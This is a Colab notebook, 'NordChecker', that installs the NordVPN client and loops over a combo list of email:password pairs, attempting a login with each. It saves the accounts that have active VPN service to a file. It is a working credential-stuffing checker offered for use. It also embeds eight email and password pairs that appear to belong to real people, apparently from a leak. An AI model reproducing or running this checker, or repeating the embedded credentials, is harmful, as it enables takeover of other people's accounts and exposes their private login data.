{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "NordChecker.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/biplobsd/ColabNordChecker/blob/master/NordChecker.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dMnsw5KKDT6E",
        "colab_type": "code",
        "cellView": "code",
        "colab": {}
      },
      "source": [
        "import os, sys, subprocess; from IPython.display import clear_output\n",
        "\n",
        "if os.path.isfile(\"/usr/bin/nordvpn\") == False:\n",
        "  !wget --directory-prefix /tmp https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn-release_1.0.0_all.deb\n",
        "  !sudo apt install -y /tmp/nordvpn-release_1.0.0_all.deb\n",
        "  !sudo apt update\n",
        "  !sudo apt install nordvpn -y\n",
        "else:\n",
        "  !pkill nordvpn\n",
        "clear_output(wait=True)\n",
        "os.system('sudo systemctl enable nordvpnd')\n",
        "os.system('nordvpn logout')\n",
        "\n",
        "configPath = r\"/content/nordvpn.txt\"\n",
        "\n",
        "#CREATE THE CONFIG\n",
        "# import your combo file (email:pass)\n",
        "data = r\"\"\"\n",
        "gianni35@icloud.com:Gianni35133\n",
        "meetpeet@live.nl:peter001\n",
        "ihar.fedasenia@gmail.com:frogiduck\n",
        "sndergaardmads@gmail.com:cgy66quy\n",
        "maloxan42@gmail.com:Spunk123\n",
        "alex.newall1993@gmail.com:Aawdipw032\n",
        "michaelbennett@outgun.com:Thrawn092134\n",
        "theraven707@gmail.com:gg6drjea\n",
        "\"\"\".split(\"\\n\")\n",
        "\n",
        "# SAVE THE CONFIG\n",
        "open(configPath, 'w').close()\n",
        "\n",
        "configFile = open(configPath, \"a+\")\n",
        "\n",
        "for line in data:\n",
        "  configFile.write(line + \"\\n\")\n",
        "  \n",
        "configFile.close()\n",
        "\n",
        "\n",
        "handle = open('/content/nordvpn.txt')\n",
        "\n",
        "count = 0\n",
        "open(\"/content/Nopass.txt\", \"w\").close()\n",
        "Nopass = open(\"/content/Nopass.txt\", \"a+\")\n",
        "for line in handle:\n",
        "    if not len(line.strip()) == 0 :\n",
        "      os.system('sudo service nordvpn start &')\n",
        "      count += 1\n",
        "      user , pas = line.strip().split(':') \n",
        "      res  = os.system('nordvpn login -u {} -p {}'.format(user,pas))\n",
        "      data = None\n",
        "      if res == 0:\n",
        "          data = str(subprocess.check_output(['nordvpn','account'],encoding='437'))\n",
        "          data = data.split('Account Information:')[1]\n",
        "          data = data.split('Email Address: ')[1]\n",
        "          email , data = data.rstrip().split('VPN Service: ')\n",
        "          Nopass.write(user+':'+pas+'\\t'+data+'\\n')\n",
        "          print(str(count)+'- ' +user+':'+pas+'\\t'+data)\n",
        "          os.system('nordvpn logout')\n",
        "      else:\n",
        "          print(str(count)+'- '+user+':'+pas+'\\t'+str(data))\n",
        "Nopass.close()\n",
        "handle.close()   "
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "JAV6gN1C51Xx",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "#Active Account Only show\n",
        "!cat Nopass.txt"
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}